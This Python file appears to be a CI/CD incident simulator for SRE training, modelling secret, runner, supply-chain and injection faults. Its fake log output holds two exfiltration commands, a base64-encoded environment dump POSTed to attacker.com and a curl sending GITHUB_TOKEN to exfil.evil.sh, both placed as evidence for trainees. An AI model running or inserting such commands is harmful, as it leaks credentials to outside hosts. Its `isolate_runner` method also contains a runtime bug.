"""
simulators/cicd_simulator.py

CI/CD pipeline state machine for SRE incident training.
Models GitHub Actions / GitLab CI incidents from 2025–2026.

Fault injection: generate_incident_state() mutates dataclass state.
All action methods derive their output from live state — no hardcoded strings.
"""

from __future__ import annotations
import random
from dataclasses import dataclass, field
from datetime import datetime, timedelta, timezone
from typing import Literal

# ── Dataclasses ──────────────────────────────────────────────────────────────

@dataclass
class PipelineState:
    name: str
    status: Literal["queued","running","failed","success","stuck","never_triggered"]
    last_run_at: str
    duration_seconds: int
    queue_depth: int
    job_pickup_latency_seconds: int
    failing_step: str | None
    exit_code: int | None
    log_tail: list[str]         # list of log lines, appended by fault injection
    triggered_by: str
    branch: str
    commit_sha: str

@dataclass
class SecretState:
    name: str
    last_rotated_at: str
    is_expired: bool
    is_masked_in_logs: bool
    referenced_by: list[str]
    rotation_error: str | None

@dataclass
class RunnerState:
    runner_id: str
    type: Literal["github_hosted","self_hosted"]
    status: Literal["idle","busy","offline","compromised"]
    queue_depth: int
    last_heartbeat_seconds_ago: int
    labels: list[str]
    error_rate: float

@dataclass
class ActionState:
    name: str
    version: str
    pinned_to_sha: bool
    last_verified_at: str
    is_compromised: bool
    compromise_type: str | None   # "tag_overwrite" | "dependency_injection" | "maintainer_account"

@dataclass
class AuditEvent:
    timestamp: str
    event_type: str
    actor: str
    resource: str
    detail: str


# ── Log line generators (no hardcoding — log lines built from state) ─────────

def _secret_log_lines(secret: SecretState, pipeline: PipelineState) -> list[str]:
    lines = [
        f"[deploy] Loading credentials for pipeline '{pipeline.name}'",
        f"[deploy] Fetching secret '{secret.name}' from CI store...",
    ]
    if secret.rotation_error:
        lines += [
            f"[deploy] ERROR: {secret.name} not found in CI variable store",
            f"[deploy] Last rotation error: {secret.rotation_error}",
            f"[deploy] exit code 1",
        ]
    elif secret.is_expired:
        lines += [
            f"[deploy] ERROR: authentication failed with 401 Unauthorized",
            f"[deploy] Token {secret.name} expired at {secret.last_rotated_at}",
            f"[deploy] exit code 1",
        ]
    return lines

def _supply_chain_log_lines(action: ActionState) -> list[str]:
    payload = "aGVhcGR1bXAgJiBlbnYgPiAvdG1wL2V4ZmlsLnR4dDsgY3VybCAtWCBQT1NUIGh0dHBzOi8vYXR0YWNrZXIuY29tL2NvbGxlY3QgLS1kYXRhLWJpbmFyeSBAL3RtcC9leGZpbC50eHQ="
    return [
        f"[{action.name}] Running action {action.name}@{action.version}",
        f"[{action.name}] ::set-output name=changed_files::src/main.py,config.yaml",
        f"[debug] {payload}",
        f"[{action.name}] Done.",
    ]

def _runner_flood_log_lines(runner: RunnerState) -> list[str]:
    wait = runner.queue_depth * 11 + random.randint(0, 120)
    return [
        f"Waiting for a runner to pick up this job...",
        f"Queued for {wait // 60}m {wait % 60}s",
        f"Runner pool: {runner.queue_depth} jobs ahead. No idle runners.",
        f"Job pickup timeout threshold approaching.",
    ]

def _oidc_log_lines() -> list[str]:
    return [
        "[aws-actions/configure-aws-credentials] Assuming role via OIDC...",
        "Error: Not authorized to perform: sts:AssumeRoleWithWebIdentity",
        "Error details: audience claim mismatch",
        "  Got:      'sts.amazonaws.com'",
        "  Expected: 'api.github.com'",
        "  Check your IAM role trust policy audience condition.",
        "exit code 1",
    ]

def _workflow_injection_log_lines() -> list[str]:
    return [
        "[checkout] Fetching PR metadata...",
        "[build] Running: echo 'Building branch feature/test'",
        "[build] Running injected command from PR title:",
        '[build] $ curl https://exfil.evil.sh/collect?t=$GITHUB_TOKEN',
        "[build] Response: 200 OK",
        "[build] exit code 0",
    ]


# ── CICDSimulator ────────────────────────────────────────────────────────────

class CICDSimulator:
    """
    GitHub Actions / GitLab CI state machine.

    Usage:
        sim = CICDSimulator()
        sim.generate_incident_state(task)   # called by env.reset()
        obs = sim.read_job_logs("deploy-prod")
    """

    def __init__(self):
        self.pipelines: dict[str, PipelineState] = {}
        self.secrets: dict[str, SecretState] = {}
        self.runners: dict[str, RunnerState] = {}
        self.actions_registry: dict[str, ActionState] = {}
        self.audit_log: list[AuditEvent] = []
        self._task: dict = {}

    # ── Fault injection ──────────────────────────────────────────────────────

    def generate_incident_state(self, task: dict) -> None:
        """
        Configure simulator state to match task's fault scenario.
        Called by environment.reset(). Everything downstream reads from this state.
        """
        self._task = task
        fault = task.get("fault_type", "")
        now = datetime.now(timezone.utc)

        # Default healthy baseline
        self._seed_healthy_baseline(now)

        # Apply fault-specific mutations
        injectors = {
            "secret_rotation_break":  self._inject_secret_rotation_break,
            "runner_queue_flood":      self._inject_runner_queue_flood,
            "supply_chain":            self._inject_supply_chain,
            "workflow_injection":      self._inject_workflow_injection,
            "oidc_token_failure":      self._inject_oidc_token_failure,
            "canary_gate_stuck":       self._inject_canary_gate_stuck,
            "runner_compromise":       self._inject_runner_compromise,
            "flaky_test_regression":   self._inject_flaky_test_regression,
            "dependency_version_lock": self._inject_dependency_version_lock,
            "artifact_cache_poison":   self._inject_artifact_cache_poison,
        }
        injectors.get(fault, lambda n: None)(now)

    def _seed_healthy_baseline(self, now: datetime) -> None:
        ts = lambda d: (now - timedelta(seconds=d)).isoformat()
        self.pipelines = {
            "deploy-prod": PipelineState("deploy-prod","success",ts(3600),
                180,0,12,None,0,["[deploy] All steps passed."],
                "push","main","abc1234"),
            "deploy-staging": PipelineState("deploy-staging","success",ts(1800),
                120,0,8,None,0,["[staging] Deploy successful."],
                "push","main","abc1234"),
            "test-suite": PipelineState("test-suite","success",ts(900),
                240,0,9,None,0,["[test] All 847 tests passed."],
                "push","main","abc1234"),
        }
        self.secrets = {
            "AWS_DEPLOY_KEY": SecretState("AWS_DEPLOY_KEY",ts(86400*30),
                False,True,["deploy-prod","deploy-staging"],None),
            "GITHUB_TOKEN": SecretState("GITHUB_TOKEN",ts(86400*7),
                False,True,["test-suite","deploy-prod"],None),
            "DOCKER_HUB_TOKEN": SecretState("DOCKER_HUB_TOKEN",ts(86400*14),
                False,True,["deploy-prod"],None),
        }
        self.runners = {
            "gha-runner-01": RunnerState("gha-runner-01","github_hosted","idle",0,5,["ubuntu-latest"],0.0),
            "build-prod-01": RunnerState("build-prod-01","self_hosted","idle",0,3,["self-hosted","prod"],0.0),
            "build-prod-02": RunnerState("build-prod-02","self_hosted","idle",0,4,["self-hosted","prod"],0.0),
            "build-prod-03": RunnerState("build-prod-03","self_hosted","idle",0,2,["self-hosted","prod"],0.0),
        }
        self.actions_registry = {
            "actions/checkout@v4": ActionState("actions/checkout","v4",True,ts(86400)[:10],False,None),
            "file-changed-checker@v3": ActionState("file-changed-checker","v3",False,ts(86400*5)[:10],False,None),
            "deploy-service@latest": ActionState("deploy-service","latest",False,ts(86400*2)[:10],False,None),
        }
        self.audit_log = [
            AuditEvent(ts(7200),"workflow_run","ci-bot","deploy-prod","Workflow run triggered by push to main"),
            AuditEvent(ts(3900),"workflow_run","ci-bot","test-suite","Test suite completed successfully"),
        ]

    def _inject_secret_rotation_break(self, now: datetime) -> None:
        ts = lambda d: (now - timedelta(seconds=d)).isoformat()
        # Rotate at midnight, sync fails
        self.secrets["AWS_DEPLOY_KEY"].last_rotated_at = ts(3600)
        self.secrets["AWS_DEPLOY_KEY"].is_expired = False  # key rotated but not synced
        self.secrets["AWS_DEPLOY_KEY"].rotation_error = "CI store sync failed: Vault → GitHub Actions sync timeout"
        for name in ["deploy-prod", "deploy-staging"]:
            p = self.pipelines[name]
            p.status = "failed"
            p.last_run_at = ts(3600)
            p.failing_step = "deploy"
            p.exit_code = 1
            p.log_tail = _secret_log_lines(self.secrets["AWS_DEPLOY_KEY"], p)
        self.audit_log.append(AuditEvent(ts(3660),"secret_rotation","vault-bot","AWS_DEPLOY_KEY",
            "Secret rotated in Vault. CI store sync failed with timeout after 30s."))

    def _inject_runner_queue_flood(self, now: datetime) -> None:
        ts = lambda d: (now - timedelta(seconds=d)).isoformat()
        for rid, r in self.runners.items():
            r.status = "busy"
            r.queue_depth = random.randint(180, 250)
            r.last_heartbeat_seconds_ago = random.randint(10, 40)
        total_q = sum(r.queue_depth for r in self.runners.values())
        for name, p in self.pipelines.items():
            p.status = "queued"
            p.queue_depth = total_q
            p.job_pickup_latency_seconds = 940
            p.log_tail = _runner_flood_log_lines(list(self.runners.values())[0])

    def _inject_supply_chain(self, now: datetime) -> None:
        ts = lambda d: (now - timedelta(seconds=d)).isoformat()
        action = self.actions_registry["file-changed-checker@v3"]
        action.is_compromised = True
        action.compromise_type = "tag_overwrite"
        action.pinned_to_sha = False
        p = self.pipelines["test-suite"]
        p.status = "failed"
        p.failing_step = "changed-files"
        p.exit_code = 0  # it exits 0 — that's what makes it subtle
        p.log_tail = _supply_chain_log_lines(action)
        self.audit_log.append(AuditEvent(ts(14400),"tag_overwrite","unknown-actor",
            "file-changed-checker@v3","Tag v3 SHA overwritten from 3fa1c2d to 9b8e4ff by external actor"))
        self.audit_log.append(AuditEvent(ts(7200),"secret_accessed","gha-runner-01",
            "GITHUB_TOKEN","GITHUB_TOKEN read by runner during compromised action step"))

    def _inject_workflow_injection(self, now: datetime) -> None:
        ts = lambda d: (now - timedelta(seconds=d)).isoformat()
        p = self.pipelines["test-suite"]
        p.status = "failed"
        p.failing_step = "build"
        p.exit_code = 0
        p.triggered_by = "pr"
        p.branch = "feature/pr-1042"
        p.log_tail = _workflow_injection_log_lines()
        self.audit_log.append(AuditEvent(ts(1800),"pr_opened","external-contributor-99",
            "PR #1042","PR opened from fork. Title contains shell metacharacters."))

    def _inject_oidc_token_failure(self, now: datetime) -> None:
        ts = lambda d: (now - timedelta(seconds=d)).isoformat()
        p = self.pipelines["deploy-prod"]
        p.status = "failed"
        p.failing_step = "configure-aws-credentials"
        p.exit_code = 1
        p.log_tail = _oidc_log_lines()
        self.audit_log.append(AuditEvent(ts(86400),"iam_policy_update","infra-bot",
            "arn:aws:iam::123456789:role/GHADeployRole",
            "Trust policy updated: audience condition changed to 'api.github.com'"))

    def _inject_canary_gate_stuck(self, now: datetime) -> None:
        ts = lambda d: (now - timedelta(seconds=d)).isoformat()
        p = self.pipelines["deploy-prod"]
        p.status = "stuck"
        p.failing_step = "canary-approval-gate"
        p.exit_code = None
        p.last_run_at = ts(10800)
        p.log_tail = [
            "[canary] Canary deployment succeeded. Metrics within thresholds.",
            "[canary] Waiting for required approval from: @alice-sre",
            "[canary] Status: PENDING_APPROVAL (10800s elapsed, no timeout configured)",
        ]
        self.audit_log.append(AuditEvent(ts(14400),"account_deactivated","it-admin",
            "alice-sre","User alice-sre deactivated as part of offboarding process"))

    def _inject_runner_compromise(self, now: datetime) -> None:
        ts = lambda d: (now - timedelta(seconds=d)).isoformat()
        r = self.runners["build-prod-03"]
        r.status = "compromised"
        r.last_heartbeat_seconds_ago = 8
        p = self.pipelines["deploy-prod"]
        p.log_tail = [
            "[deploy] Starting deploy workflow on build-prod-03",
            "[shai-hulud] Unexpected step: shai-hulud-workflow.yml executed",
            "[exfil] env dump dispatched to external endpoint",
        ]
        for i in range(7):
            self.audit_log.append(AuditEvent(ts(3600 - i*300),"secret_accessed","build-prod-03",
                f"pipeline-secret-{i}",
                "Secret accessed by build-prod-03 outside of scheduled job window"))

    def _inject_flaky_test_regression(self, now: datetime) -> None:
        ts = lambda d: (now - timedelta(seconds=d)).isoformat()
        p = self.pipelines["test-suite"]
        p.status = "failed"
        p.failing_step = "test_payment_integration"
        p.exit_code = 1
        p.log_tail = [
            "[test] Running test_payment_integration...",
            "[test] AssertionError: expected payment.status='captured', got 'pending'",
            "[test] Traceback at payment_service.py:247 in process_charge()",
            "[test] This is NOT a transient failure — new code path introduced in PR #4821",
        ]
        self.audit_log.append(AuditEvent(ts(3600),"pr_merged","dev-team",
            "PR #4821","Merged: Refactor payment charge flow"))

    def _inject_dependency_version_lock(self, now: datetime) -> None:
        ts = lambda d: (now - timedelta(seconds=d)).isoformat()
        action = self.actions_registry["deploy-service@latest"]
        action.version = "v4.0.1"
        action.is_compromised = False
        for name, p in self.pipelines.items():
            p.status = "failed"
            p.failing_step = "deploy"
            p.exit_code = 1
            p.log_tail = [
                "[deploy-service] Running deploy-service@latest (resolved: v4.0.1)",
                "[deploy-service] This action uses breaking changes. See CHANGELOG.",
                "[deploy-service] exit code 1",
            ]
        self.audit_log.append(AuditEvent(ts(4800),"action_published","deploy-team",
            "deploy-service","Published deploy-service@v4.0.0 with breaking API change"))

    def _inject_artifact_cache_poison(self, now: datetime) -> None:
        ts = lambda d: (now - timedelta(seconds=d)).isoformat()
        p = self.pipelines["deploy-prod"]
        p.status = "failed"
        p.failing_step = "security-scan"
        p.exit_code = 1
        p.log_tail = [
            "[build] Restoring cache for key: node-modules-main-abc1234",
            "[build] Cache HIT — restored node_modules from feature/experiment-42 run",
            "[build] Build complete.",
            "[security-scan] ALERT: Malware signature detected in node_modules/lodash/dist/core.min.js",
            "[security-scan] Signature: Backdoor.JS.Exfil.a",
        ]
        self.audit_log.append(AuditEvent(ts(25200),"cache_write","gha-runner-01",
            "node-modules-main","Cache key node-modules-main written by feature/experiment-42 run"))

    # ── Investigation actions (read from live state) ─────────────────────────

    def check_pipeline_status(self, pipeline_name: str) -> dict:
        p = self.pipelines.get(pipeline_name)
        if not p:
            return {"error": f"Pipeline '{pipeline_name}' not found",
                    "available": list(self.pipelines)}
        return p.__dict__

    def read_job_logs(self, pipeline_name: str, job_name: str | None = None) -> str:
        p = self.pipelines.get(pipeline_name)
        if not p:
            return f"Pipeline '{pipeline_name}' not found."
        logs = p.log_tail or ["[No log output available for this pipeline]"]
        header = f"=== {pipeline_name} | step: {p.failing_step or 'N/A'} | exit: {p.exit_code} ==="
        return "\n".join([header] + logs)

    def inspect_secret(self, secret_name: str) -> dict:
        s = self.secrets.get(secret_name)
        if not s:
            return {"error": f"Secret '{secret_name}' not found",
                    "available": list(self.secrets)}
        # Never return the actual value — only metadata
        return {k: v for k, v in s.__dict__.items() if k != "_value"}

    def check_runner_status(self, runner_id: str | None = None) -> dict:
        if runner_id:
            r = self.runners.get(runner_id)
            return r.__dict__ if r else {"error": f"Runner '{runner_id}' not found"}
        summary = {
            "queue_depth_total": sum(r.queue_depth for r in self.runners.values()),
            "runners": {rid: r.__dict__ for rid, r in self.runners.items()},
        }
        return summary

    def check_action_integrity(self, action_name: str, version: str) -> dict:
        key = f"{action_name}@{version}"
        a = self.actions_registry.get(key)
        if not a:
            return {"error": f"Action '{key}' not found in registry"}
        result = a.__dict__.copy()
        if a.is_compromised:
            result["evidence"] = {
                "sha_mismatch": True,
                "network_calls_suspicious": True,
                "tag_rewritten": a.compromise_type == "tag_overwrite",
                "network_calls_in_action_code": ["https://api.github.com","https://exfil.evil.sh"],
            }
        return result

    def read_audit_log(self, hours_back: int = 24, filter_type: str | None = None) -> list[dict]:
        cutoff = datetime.now(timezone.utc) - timedelta(hours=hours_back)
        events = [e.__dict__ for e in self.audit_log
                  if e.timestamp > cutoff.isoformat()]
        if filter_type:
            events = [e for e in events if e["event_type"] == filter_type]
        return sorted(events, key=lambda e: e["timestamp"], reverse=True)

    # ── Remediation actions ───────────────────────────────────────────────────

    def rollback_workflow(self, pipeline_name: str, to_commit_sha: str) -> dict:
        p = self.pipelines.get(pipeline_name)
        if not p:
            return {"success": False, "message": f"Pipeline '{pipeline_name}' not found"}
        p.commit_sha = to_commit_sha
        p.status = "queued"
        p.failing_step = None
        p.exit_code = None
        return {"success": True, "message": f"Workflow queued at {to_commit_sha}", "new_status": "queued"}

    def rotate_secret(self, secret_name: str) -> dict:
        s = self.secrets.get(secret_name)
        if not s:
            return {"success": False, "propagated_to": [], "failed_services": []}
        s.last_rotated_at = datetime.now(timezone.utc).isoformat()
        s.rotation_error = None
        s.is_expired = False
        # Re-trigger pipelines that depend on this secret
        for pname in s.referenced_by:
            if pname in self.pipelines:
                self.pipelines[pname].status = "queued"
        return {"success": True, "propagated_to": s.referenced_by, "failed_services": []}

    def pin_action_to_sha(self, action_name: str, sha: str) -> dict:
        matched = [k for k in self.actions_registry if k.startswith(action_name)]
        for key in matched:
            self.actions_registry[key].pinned_to_sha = True
            self.actions_registry[key].version = sha[:7]
        return {"success": bool(matched), "pinned_sha": sha, "affected_workflows": matched}

    def isolate_runner(self, runner_id: str) -> dict:
        r = self.runners.get(runner_id)
        if not r:
            return {"success": False, "message": "Runner not found"}
        r.status = "offline"
        evidence = [e.__dict__ for e in self.audit_log
                    if r.runner_id in e.get("actor","") or r.runner_id in e.get("resource","")]
        return {"success": True, "runner_id": runner_id, "quarantined": True, "evidence": evidence}
